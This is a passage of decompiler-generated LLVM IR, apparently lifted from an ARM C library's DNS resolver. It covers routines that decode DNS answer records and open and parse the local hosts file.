  %v1_eed8 = load i32, i32* @r4, align 4
  %v2_eed8 = sub i32 %v1_eed8, %v2_eed0
  %v0_eee4 = load i32, i32* @r6, align 4
  %v2_eee4 = add i32 %v0_eee4, %v2_eed0
  store i32 %v2_eee4, i32* %r2.global-to-local, align 4
  %v7_eee8 = icmp sgt i32 %v2_eed8, 3
  br i1 %v7_eee8, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_eeec = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_eeec, i32* @r4, align 4
  store i32 %v6_eebc, i32* @r5, align 4
  store i32 %v9_eebc, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_eef0 = load i32, i32* @r5, align 4
  %v1_eef0 = add i32 %v0_eef0, 5
  %v2_eef0 = inttoptr i32 %v1_eef0 to i8*
  %v3_eef0 = load i8, i8* %v2_eef0, align 1
  %v5_eef4 = inttoptr i32 %v2_eee4 to i8*
  store i8 %v3_eef0, i8* %v5_eef4, align 1
  %v0_eef8 = load i32, i32* @r5, align 4
  %v1_eef8 = add i32 %v0_eef8, 4
  %v2_eef8 = inttoptr i32 %v1_eef8 to i32*
  %v3_eef8 = load i32, i32* %v2_eef8, align 4
  %v1_eefc = trunc i32 %v3_eef8 to i8
  %v2_eefc = load i32, i32* %r2.global-to-local, align 4
  %v3_eefc = add i32 %v2_eefc, 1
  %v4_eefc = inttoptr i32 %v3_eefc to i8*
  store i8 %v1_eefc, i8* %v4_eefc, align 1
  %v0_ef00 = load i32, i32* @r5, align 4
  %v1_ef00 = add i32 %v0_ef00, 9
  %v2_ef00 = inttoptr i32 %v1_ef00 to i8*
  %v3_ef00 = load i8, i8* %v2_ef00, align 1
  %v2_ef04 = load i32, i32* %r2.global-to-local, align 4
  %v3_ef04 = add i32 %v2_ef04, 2
  %v4_ef04 = inttoptr i32 %v3_ef04 to i8*
  store i8 %v3_ef00, i8* %v4_ef04, align 1
  %v0_ef08 = load i32, i32* @r5, align 4
  %v1_ef08 = add i32 %v0_ef08, 8
  %v2_ef08 = inttoptr i32 %v1_ef08 to i32*
  %v3_ef08 = load i32, i32* %v2_ef08, align 4
  %v0_ef0c = load i32, i32* %r0.global-to-local, align 4
  %v1_ef0c = add i32 %v0_ef0c, 4
  store i32 %v1_ef0c, i32* %r0.global-to-local, align 4
  %v1_ef10 = trunc i32 %v3_ef08 to i8
  %v2_ef10 = load i32, i32* %r2.global-to-local, align 4
  %v3_ef10 = add i32 %v2_ef10, 3
  %v4_ef10 = inttoptr i32 %v3_ef10 to i8*
  store i8 %v1_ef10, i8* %v4_ef10, align 1
  %v2_ef14 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_ef14, i32* @r4, align 4
  store i32 %v6_eebc, i32* @r5, align 4
  store i32 %v9_eebc, i32* @r6, align 4
  ret i32 %v1_ef0c

; uselistorder directives
  uselistorder i32 %v2_eed0, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_eebc, { 1, 0, 2 }
  uselistorder i32 %v6_eebc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_ef1c = call i32 @__length_dotted()
  %v1_ef20 = icmp slt i32 %v0_ef1c, 0
  br i1 %v1_ef20, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_ef24 = add i32 %v0_ef1c, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_ef28 = phi i32 [ %v0_ef1c, %entry ], [ %v4_ef24, %bb ]
  ret i32 %v5_ef28

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_ef2c = load i32, i32* @r4, align 4
  %v6_ef2c = load i32, i32* @r5, align 4
  %v9_ef2c = load i32, i32* @r6, align 4
  %v12_ef2c = load i32, i32* @r7, align 4
  %v21_ef2c = load i32, i32* @sl, align 4
  %v2_ef30 = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_ef30, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_ef4c = call i32 @__decode_dotted()
  store i32 %v0_ef4c, i32* %r0.global-to-local, align 4
  store i32 %v0_ef4c, i32* @r7, align 4
  %v1_ef50 = icmp slt i32 %v0_ef4c, 0
  %v0_ef54 = load i32, i32* @r4, align 4
  %v2_ef54 = add i32 %v0_ef54, %v0_ef4c
  store i32 %v2_ef54, i32* %r8.global-to-local, align 4
  br i1 %v1_ef50, label %bb14, label %dec_label_pc_ef64

dec_label_pc_ef64:                                ; preds = %entry
  %v1_ef5c = load i32, i32* @r5, align 4
  %v2_ef5c = sub i32 %v1_ef5c, %v2_ef54
  %v1_ef64 = add i32 %v2_ef5c, -10
  store i32 %v1_ef64, i32* @r5, align 4
  %v6_ef64 = icmp slt i32 %v1_ef64, 0
  store i32 %v2_ef30, i32* %r0.global-to-local, align 4
  %v0_ef6c = load i32, i32* @sl, align 4
  %v2_ef6c = add i32 %v0_ef6c, %v2_ef54
  store i32 %v2_ef6c, i32* @r4, align 4
  br i1 %v6_ef64, label %bb, label %dec_label_pc_ef78

bb:                                               ; preds = %dec_label_pc_ef64
  br label %bb14

dec_label_pc_ef78:                                ; preds = %dec_label_pc_ef64
  %v1_ef78 = bitcast i32* %stack_var_-288 to i8*
  %v2_ef78 = call i32 @__GI_strdup(i8* %v1_ef78)
  store i32 %v2_ef78, i32* %r0.global-to-local, align 4
  %v1_ef7c = load i32, i32* @r6, align 4
  %v2_ef7c = inttoptr i32 %v1_ef7c to i32*
  store i32 %v2_ef78, i32* %v2_ef7c, align 4
  %v0_ef80 = load i32, i32* @sl, align 4
  %v1_ef80 = load i32, i32* %r8.global-to-local, align 4
  %v2_ef80 = add i32 %v1_ef80, %v0_ef80
  %v3_ef80 = inttoptr i32 %v2_ef80 to i8*
  %v4_ef80 = load i8, i8* %v3_ef80, align 1
  %v6_ef80 = zext i8 %v4_ef80 to i32
  %v0_ef84 = load i32, i32* @r4, align 4
  %v1_ef84 = add i32 %v0_ef84, 1
  %v2_ef84 = inttoptr i32 %v1_ef84 to i8*
  %v3_ef84 = load i8, i8* %v2_ef84, align 1
  %v4_ef84 = zext i8 %v3_ef84 to i32
  %v4_ef88 = mul nuw nsw i32 %v6_ef80, 256
  %v5_ef88 = or i32 %v4_ef84, %v4_ef88
  store i32 %v5_ef88, i32* %r3.global-to-local, align 4
  %v1_ef8c = load i32, i32* @r6, align 4
  %v2_ef8c = add i32 %v1_ef8c, 4
  %v3_ef8c = inttoptr i32 %v2_ef8c to i32*
  store i32 %v5_ef88, i32* %v3_ef8c, align 4
  %v0_ef90 = load i32, i32* @r4, align 4
  %v1_ef90 = add i32 %v0_ef90, 2
  store i32 %v1_ef90, i32* %r1.global-to-local, align 4
  %v2_ef94 = inttoptr i32 %v1_ef90 to i8*
  %v3_ef94 = load i8, i8* %v2_ef94, align 1
  %v4_ef94 = zext i8 %v3_ef94 to i32
  %v1_ef98 = add i32 %v0_ef90, 3
  %v2_ef98 = inttoptr i32 %v1_ef98 to i8*
  %v3_ef98 = load i8, i8* %v2_ef98, align 1
  %v4_ef98 = zext i8 %v3_ef98 to i32
  %v4_ef9c = mul nuw nsw i32 %v4_ef94, 256
  %v5_ef9c = or i32 %v4_ef98, %v4_ef9c
  store i32 %v5_ef9c, i32* %r3.global-to-local, align 4
  %v1_efa0 = load i32, i32* @r6, align 4
  %v2_efa0 = add i32 %v1_efa0, 8
  %v3_efa0 = inttoptr i32 %v2_efa0 to i32*
  store i32 %v5_ef9c, i32* %v3_efa0, align 4
  %v0_efa4 = load i32, i32* %r1.global-to-local, align 4
  %v1_efa4 = add i32 %v0_efa4, 2
  %v1_efa8 = add i32 %v0_efa4, 3
  %v2_efa8 = inttoptr i32 %v1_efa8 to i8*
  %v3_efa8 = load i8, i8* %v2_efa8, align 1
  %v4_efa8 = zext i8 %v3_efa8 to i32
  store i32 %v4_efa8, i32* %r3.global-to-local, align 4
  %v2_efac = inttoptr i32 %v1_efa4 to i8*
  %v3_efac = load i8, i8* %v2_efac, align 1
  %v4_efac = zext i8 %v3_efac to i32
  store i32 %v4_efac, i32* %r0.global-to-local, align 4
  %v1_efb0 = add i32 %v0_efa4, 5
  %v2_efb0 = inttoptr i32 %v1_efb0 to i8*
  %v3_efb0 = load i8, i8* %v2_efb0, align 1
  %v4_efb0 = zext i8 %v3_efb0 to i32
  %v3_efb4 = mul nuw nsw i32 %v4_efa8, 65536
  store i32 %v3_efb4, i32* %r3.global-to-local, align 4
  %v1_efb8 = add i32 %v0_efa4, 4
  %v2_efb8 = inttoptr i32 %v1_efb8 to i8*
  %v3_efb8 = load i8, i8* %v2_efb8, align 1
  %v4_efb8 = zext i8 %v3_efb8 to i32
  %v4_efbc = mul nuw i32 %v4_efac, 16777216
  %v5_efbc = or i32 %v4_efbc, %v3_efb4
  %v2_efc0 = or i32 %v5_efbc, %v4_efb0
  %v4_efc4 = mul nuw nsw i32 %v4_efb8, 256
  %v5_efc4 = or i32 %v2_efc0, %v4_efc4
  store i32 %v5_efc4, i32* %r3.global-to-local, align 4
  %v1_efc8 = load i32, i32* @r6, align 4
  %v2_efc8 = add i32 %v1_efc8, 12
  %v3_efc8 = inttoptr i32 %v2_efc8 to i32*
  store i32 %v5_efc4, i32* %v3_efc8, align 4
  %v0_efcc = load i32, i32* %r1.global-to-local, align 4
  %v1_efcc = add i32 %v0_efcc, 6
  %v2_efcc = inttoptr i32 %v1_efcc to i8*
  %v3_efcc = load i8, i8* %v2_efcc, align 1
  %v4_efcc = zext i8 %v3_efcc to i32
  %v0_efd0 = load i32, i32* @r4, align 4
  %v1_efd0 = add i32 %v0_efd0, 9
  %v2_efd0 = inttoptr i32 %v1_efd0 to i8*
  %v3_efd0 = load i8, i8* %v2_efd0, align 1
  %v4_efd0 = zext i8 %v3_efd0 to i32
  %v1_efd4 = add i32 %v0_efd0, 10
  store i32 %v1_efd4, i32* %r0.global-to-local, align 4
  %v4_efd8 = mul nuw nsw i32 %v4_efcc, 256
  %v5_efd8 = or i32 %v4_efd0, %v4_efd8
  store i32 %v5_efd8, i32* %r3.global-to-local, align 4
  %v0_efdc = load i32, i32* %r8.global-to-local, align 4
  %v1_efdc = add i32 %v0_efdc, 10
  %v0_efe0 = load i32, i32* @r5, align 4
  %v1_efe4 = add nuw nsw i32 %v5_efd8, 10
  store i32 %v1_efe4, i32* %r1.global-to-local, align 4
  %v1_efe8 = load i32, i32* @r6, align 4
  %v2_efe8 = add i32 %v1_efe8, 24
  %v3_efe8 = inttoptr i32 %v2_efe8 to i32*
  store i32 %v1_efdc, i32* %v3_efe8, align 4
  %v0_efec = load i32, i32* %r0.global-to-local, align 4
  %v1_efec = load i32, i32* @r6, align 4
  %v2_efec = add i32 %v1_efec, 20
  %v3_efec = inttoptr i32 %v2_efec to i32*
  store i32 %v0_efec, i32* %v3_efec, align 4
  %v0_eff0 = load i32, i32* %r3.global-to-local, align 4
  %v1_eff0 = load i32, i32* @r6, align 4
  %v2_eff0 = add i32 %v1_eff0, 16
  %v3_eff0 = inttoptr i32 %v2_eff0 to i32*
  store i32 %v0_eff0, i32* %v3_eff0, align 4
  %v0_eff4 = load i32, i32* @r7, align 4
  %v1_eff4 = load i32, i32* %r1.global-to-local, align 4
  %v2_eff4 = add i32 %v1_eff4, %v0_eff4
  %v5_eff8 = icmp slt i32 %v0_efe0, %v5_efd8
  %.v2_eff4 = select i1 %v5_eff8, i32 -1, i32 %v2_eff4
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_ef78, %entry
  %v0_effc = phi i32 [ %.v2_eff4, %dec_label_pc_ef78 ], [ %v1_ef64, %bb ], [ %v0_ef4c, %entry ]
  store i32 %v0_effc, i32* %r0.global-to-local, align 4
  store i32 %v3_ef2c, i32* @r4, align 4
  store i32 %v6_ef2c, i32* @r5, align 4
  store i32 %v9_ef2c, i32* @r6, align 4
  store i32 %v12_ef2c, i32* @r7, align 4
  store i32 %v21_ef2c, i32* @sl, align 4
  ret i32 %v0_effc

; uselistorder directives
  uselistorder i32 %v0_effc, { 1, 0 }
  uselistorder i32 %v5_efd8, { 1, 0, 2 }
  uselistorder i32 %v3_efb4, { 1, 0 }
  uselistorder i32 %v1_ef64, { 0, 2, 1 }
  uselistorder i32 %v0_ef4c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_124d4.250 to i32), i32* @r1, align 4
  %v0_f00c = load i32, i32* @lr, align 4
  store i32 %v0_f00c, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_12550.344 to i32), i32* @r0, align 4
  %v3_f014 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_12550.344 to i32), i32 ptrtoint (i32* @global_var_124d4.250 to i32))
  %v2_f018 = icmp eq i32 %v3_f014, 0
  store i32 ptrtoint (i32* @global_var_124d4.250 to i32), i32* @r1, align 4
  br i1 %v2_f018, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_f014

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_1255c.346 to i32), i32* @r0, align 4
  %v2_f028 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_f028, i32* @lr, align 4
  %v3_f02c = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1255c.346 to i32), i32 ptrtoint (i32* @global_var_124d4.250 to i32))
  ret i32 %v3_f02c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_124d4.250 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_f03c = load i32, i32* @r4, align 4
  %v6_f03c = load i32, i32* @r5, align 4
  %v12_f03c = load i32, i32* @r7, align 4
  %v15_f03c = load i32, i32* @r8, align 4
  %v21_f03c = load i32, i32* @sl, align 4
  %v24_f03c = load i32, i32* @fp, align 4
  store i32 %tmp62, i32* @r4, align 4
  %v1_f048 = sub i32 0, %tmp62
  %v1_f04c = urem i32 %v1_f048, 4
  store i32 %v1_f04c, i32* %ip.global-to-local, align 4
  %v2_f04c = icmp eq i32 %v1_f04c, 0
  %v0_f050 = load i32, i32* @r2, align 4
  %v0_f054 = load i32, i32* @r0, align 4
  %v0_f058 = load i32, i32* @r1, align 4
  %v0_f05c = load i32, i32* @r3, align 4
  store i32 %v0_f05c, i32* %stack_var_-64, align 4
  store i32 %tmp58, i32* %r2.global-to-local, align 4
  br i1 %v2_f04c, label %dec_label_pc_f07c, label %dec_label_pc_f06c

dec_label_pc_f06c:                                ; preds = %entry
  %v2_f06c = sub i32 %tmp58, %v1_f04c
  %v3_f06c = icmp ult i32 %tmp58, %v1_f04c
  br i1 %v3_f06c, label %dec_label_pc_f350, label %dec_label_pc_f074

dec_label_pc_f074:                                ; preds = %dec_label_pc_f06c
  store i32 %v2_f06c, i32* %r2.global-to-local, align 4
  %v2_f078 = add i32 %v1_f04c, %tmp62
  store i32 %v2_f078, i32* @r4, align 4
  br label %dec_label_pc_f07c

dec_label_pc_f07c:                                ; preds = %entry, %dec_label_pc_f074
  %v0_f08c = phi i32 [ %tmp62, %entry ], [ %v2_f078, %dec_label_pc_f074 ]
  %v0_f090 = phi i32 [ %tmp58, %entry ], [ %v2_f06c, %dec_label_pc_f074 ]
  %tmp = icmp ult i32 %v0_f090, 32
  br i1 %tmp, label %dec_label_pc_f350, label %dec_label_pc_f084

dec_label_pc_f084:                                ; preds = %dec_label_pc_f07c
  store i32 %v0_f05c, i32* %r0.global-to-local, align 4
  %v7_f088 = icmp eq i32 %v0_f05c, 1
  %v1_f08c = add i32 %v0_f08c, 32
  store i32 %v1_f08c, i32* @fp, align 4
  %v1_f090 = add i32 %v0_f090, -32
  store i32 %v1_f090, i32* @r8, align 4
  br i1 %v7_f088, label %dec_label_pc_f1bc, label %dec_label_pc_f098

dec_label_pc_f098:                                ; preds = %dec_label_pc_f084
  store i32 %tmp57, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_f0a4 = inttoptr i32 %tmp57 to i32*
  store i32 -1, i32* %v2_f0a4, align 4
  %tmp81 = icmp ult i32 %v1_f090, 4
  br i1 %tmp81, label %dec_label_pc_f350, label %dec_label_pc_f0ac

dec_label_pc_f0ac:                                ; preds = %dec_label_pc_f098
  %v0_f0ac = load i32, i32* %r2.global-to-local, align 4
  %v1_f0ac = add i32 %v0_f0ac, -36
  store i32 %v1_f0ac, i32* %r3.global-to-local, align 4
  %tmp82 = icmp ult i32 %v1_f0ac, 8
  br i1 %tmp82, label %dec_label_pc_f350, label %dec_label_pc_f0b8

dec_label_pc_f0b8:                                ; preds = %dec_label_pc_f0ac
  %v0_f0b8 = load i32, i32* @r8, align 4
  %tmp83 = icmp ult i32 %v0_f0b8, 16
  br i1 %tmp83, label %dec_label_pc_f350, label %dec_label_pc_f0c0

dec_label_pc_f0c0:                                ; preds = %dec_label_pc_f0b8
  %v1_f0c0 = add i32 %v0_f0ac, -48
  store i32 %v1_f0c0, i32* %r3.global-to-local, align 4
  %tmp84 = icmp ult i32 %v1_f0c0, 8
  br i1 %tmp84, label %dec_label_pc_f350, label %dec_label_pc_f0cc

dec_label_pc_f0cc:                                ; preds = %dec_label_pc_f0c0
  %v1_f0cc = add i32 %v0_f0ac, -44
  store i32 %v1_f0cc, i32* @r8, align 4
  %v1_f0d0 = add i32 %v0_f0ac, -56
  store i32 %v1_f0d0, i32* %r3.global-to-local, align 4
  %v3_f0d4 = icmp ult i32 %v1_f0d0, %v1_f0cc
  br i1 %v3_f0d4, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_f0cc
  %v1_f0dc = load i32, i32* @r4, align 4
  %v2_f0dc = add i32 %v1_f0dc, 44
  br label %bb75

.thread2:                                         ; preds = %dec_label_pc_f0cc
  store i32 %v1_f0d0, i32* @r8, align 4
  %v1_f0e0.pre = load i32, i32* @r4, align 4
  %v2_f0e0 = add i32 %v1_f0e0.pre, 56
  br label %bb75

bb75:                                             ; preds = %bb, %.thread2
  %storemerge = phi i32 [ %v2_f0e0, %.thread2 ], [ %v2_f0dc, %bb ]
  %v0_f0e8 = phi i32 [ %v1_f0e0.pre, %.thread2 ], [ %v1_f0dc, %bb ]
  %v0_f0e4 = phi i32 [ %v1_f0d0, %.thread2 ], [ %v1_f0cc, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_f0e8 = add i32 %v0_f0e8, 36
  store i32 %v1_f0e8, i32* @r6, align 4
  %v1_f0ec = add i32 %v0_f0e8, 48
  store i32 %v1_f0ec, i32* %sl.global-to-local, align 4
  %tmp85 = icmp ult i32 %v0_f0e4, 80
  br i1 %tmp85, label %dec_label_pc_f350, label %dec_label_pc_f0f4

dec_label_pc_f0f4:                                ; preds = %bb75
  %v0_f0f4 = call i32 @__open_etc_hosts()
  store i32 %v0_f0f4, i32* %r0.global-to-local, align 4
  %v2_f0f8 = icmp eq i32 %v0_f0f4, 0
  br i1 %v2_f0f8, label %dec_label_pc_f114, label %.thread

.thread:                                          ; preds = %dec_label_pc_f0f4
  %v1_f100 = load i32, i32* @fp, align 4
  store i32 %v1_f100, i32* @r7, align 4
  %v1_f104 = load i32, i32* @r5, align 4
  store i32 %v1_f104, i32* @fp, align 4
  %v1_f108 = load i32, i32* @r6, align 4
  %v1_f10c = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_f1c8

dec_label_pc_f114:                                ; preds = %dec_label_pc_f0f4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp54, i32* %r2.global-to-local, align 4
  %v2_f11c = inttoptr i32 %tmp54 to i32*
  store i32 0, i32* %v2_f11c, align 4
  %v0_f120 = call i32 @__errno_location()
  store i32 %v0_f120, i32* %r0.global-to-local, align 4
  %v1_f124 = inttoptr i32 %v0_f120 to i32*
  %v2_f124 = load i32, i32* %v1_f124, align 4
  store i32 %v2_f124, i32* @sl, align 4
  br label %dec_label_pc_f354

dec_label_pc_f12c:                                ; preds = %dec_label_pc_f2dc
  %v0_f12c = load i32, i32* @r4, align 4
  %v1_f12c = add i32 %v0_f12c, 4
  %v2_f12c = inttoptr i32 %v1_f12c to i32*
  %v3_f12c = load i32, i32* %v2_f12c, align 4
  %v1_f130 = load i32, i32* @sb, align 4
  %v2_f130 = inttoptr i32 %v1_f130 to i32*
  store i32 %v3_f12c, i32* %v2_f130, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp54, i32* %ip.global-to-local, align 4
  %v0_f144 = load i32, i32* @r4, align 4
  %v1_f144 = add i32 %v0_f144, 8
  store i32 %v1_f144, i32* %r1.global-to-local, align 4
  %v1_f148 = load i32, i32* @sb, align 4
  %v2_f148 = add i32 %v1_f148, 8
  %v3_f148 = inttoptr i32 %v2_f148 to i32*
  store i32 2, i32* %v3_f148, align 4
  %v0_f14c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f14c, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_f154 = load i32, i32* @sb, align 4
  %v1_f154 = load i32, i32* %ip.global-to-local, align 4
  %v2_f154 = inttoptr i32 %v1_f154 to i32*
  store i32 %v0_f154, i32* %v2_f154, align 4
  %v0_f158 = load i32, i32* @r7, align 4
  %v1_f158 = load i32, i32* %r0.global-to-local, align 4
  %v2_f158 = inttoptr i32 %v1_f158 to i32*
  store i32 %v0_f158, i32* %v2_f158, align 4
  %v0_f15c = load i32, i32* %r3.global-to-local, align 4
  %v1_f15c = load i32, i32* @sb, align 4
  %v2_f15c = add i32 %v1_f15c, 12
  %v3_f15c = inttoptr i32 %v2_f15c to i32*
  store i32 %v0_f15c, i32* %v3_f15c, align 4
  %v0_f160 = load i32, i32* %r0.global-to-local, align 4
  %v1_f160 = load i32, i32* @sb, align 4
  %v2_f160 = add i32 %v1_f160, 16
  %v3_f160 = inttoptr i32 %v2_f160 to i32*
  store i32 %v0_f160, i32* %v3_f160, align 4
  %v0_f164 = load i32, i32* %r1.global-to-local, align 4
  %v1_f164 = load i32, i32* @sb, align 4
  %v2_f164 = add i32 %v1_f164, 4
  %v3_f164 = inttoptr i32 %v2_f164 to i32*
  store i32 %v0_f164, i32* %v3_f164, align 4
  %v0_f168 = load i32, i32* %r2.global-to-local, align 4
  %v1_f168 = load i32, i32* %r0.global-to-local, align 4
  %v2_f168 = add i32 %v1_f168, 4
  %v3_f168 = inttoptr i32 %v2_f168 to i32*
  store i32 %v0_f168, i32* %v3_f168, align 4
  br label %dec_label_pc_f338

dec_label_pc_f170:                                ; preds = %dec_label_pc_f304
  store i32 %tmp54, i32* %ip.global-to-local, align 4
  %v0_f174 = load i32, i32* @r4, align 4
  %v1_f174 = add i32 %v0_f174, 4
  %v2_f174 = inttoptr i32 %v1_f174 to i32*
  %v3_f174 = load i32, i32* %v2_f174, align 4
  store i32 %v3_f174, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_f17c = load i32, i32* @sb, align 4
  %v2_f17c = inttoptr i32 %tmp54 to i32*
  store i32 %v0_f17c, i32* %v2_f17c, align 4
  store i32 %v0_f1d4, i32* %ip.global-to-local, align 4
  %v0_f184 = load i32, i32* %r3.global-to-local, align 4
  %v1_f184 = load i32, i32* @sb, align 4
  %v2_f184 = inttoptr i32 %v1_f184 to i32*
  store i32 %v0_f184, i32* %v2_f184, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_f190 = load i32, i32* %ip.global-to-local, align 4
  %v1_f190 = load i32, i32* %r0.global-to-local, align 4
  %v2_f190 = inttoptr i32 %v1_f190 to i32*
  store i32 %v0_f190, i32* %v2_f190, align 4
  %v0_f194 = load i32, i32* %r3.global-to-local, align 4
  %v1_f194 = load i32, i32* @sb, align 4
  %v2_f194 = add i32 %v1_f194, 12
  %v3_f194 = inttoptr i32 %v2_f194 to i32*
  store i32 %v0_f194, i32* %v3_f194, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_f1a0 = load i32, i32* @r4, align 4
  %v1_f1a0 = add i32 %v0_f1a0, 8
  store i32 %v1_f1a0, i32* %r1.global-to-local, align 4
  %v0_f1a4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f1a4, i32* @sl, align 4
  %v1_f1a8 = load i32, i32* @sb, align 4
  %v2_f1a8 = add i32 %v1_f1a8, 8
  %v3_f1a8 = inttoptr i32 %v2_f1a8 to i32*
  store i32 10, i32* %v3_f1a8, align 4
  %v0_f1ac = load i32, i32* %r3.global-to-local, align 4
  %v1_f1ac = load i32, i32* @sb, align 4
  %v2_f1ac = add i32 %v1_f1ac, 16
  %v3_f1ac = inttoptr i32 %v2_f1ac to i32*
  store i32 %v0_f1ac, i32* %v3_f1ac, align 4
  %v0_f1b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_f1b0 = load i32, i32* @sb, align 4
  %v2_f1b0 = add i32 %v1_f1b0, 4
  %v3_f1b0 = inttoptr i32 %v2_f1b0 to i32*
  store i32 %v0_f1b0, i32* %v3_f1b0, align 4
  %v0_f1b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_f1b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_f1b4 = add i32 %v1_f1b4, 4
  %v3_f1b4 = inttoptr i32 %v2_f1b4 to i32*
  store i32 %v0_f1b4, i32* %v3_f1b4, align 4
  br label %dec_label_pc_f338

dec_label_pc_f1bc:                                ; preds = %dec_label_pc_f084
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp57 to i32*
  br label %dec_label_pc_f1c8

dec_label_pc_f1c8:                                ; preds = %.thread, %dec_label_pc_f1bc
  %v2_f1d8.pre-phi = phi i32* [ %v2_f0a4, %.thread ], [ %.pre, %dec_label_pc_f1bc ]
  %v0_f1d4 = phi i32 [ %v1_f100, %.thread ], [ 0, %dec_label_pc_f1bc ]
  %stack_var_-40.1 = phi i32 [ %v1_f10c, %.thread ], [ 0, %dec_label_pc_f1bc ]
  %stack_var_-48.1 = phi i32 [ %v1_f108, %.thread ], [ 0, %dec_label_pc_f1bc ]
  %stack_var_-52.0 = phi i32 [ %v0_f0f4, %.thread ], [ %v0_f054, %dec_label_pc_f1bc ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp57, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_f1d8.pre-phi, align 4
  %v2_f29c = inttoptr i32 %v0_f058 to i8*
  %v7_f2d4 = icmp eq i32 %v0_f050, 2
  %v7_f2fc = icmp eq i32 %v0_f050, 10
  br label %dec_label_pc_f320

dec_label_pc_f1e0:                                ; preds = %dec_label_pc_f320
  %v0_f1e0 = load i32, i32* @fp, align 4
  store i32 %v0_f1e0, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_f1e8 = call i32 @__GI_strchr(i32 %v0_f1e0, i32 35)
  store i32 %v2_f1e8, i32* %r0.global-to-local, align 4
  %v3_f1ec = icmp eq i32 %v2_f1e8, 0
  br i1 %v3_f1ec, label %.thread11, label %bb76

.thread11:                                        ; preds = %dec_label_pc_f1e0
  %v0_f1f412 = load i32, i32* @fp, align 4
  store i32 %v0_f1f412, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_f260.preheader

bb76:                                             ; preds = %dec_label_pc_f1e0
  %v3_f1e8 = inttoptr i32 %v2_f1e8 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_f1f4 = load i32, i32* @fp, align 4
  store i32 %v0_f1f4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_f1e8, align 1
  %v0_f26031.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f260.preheader

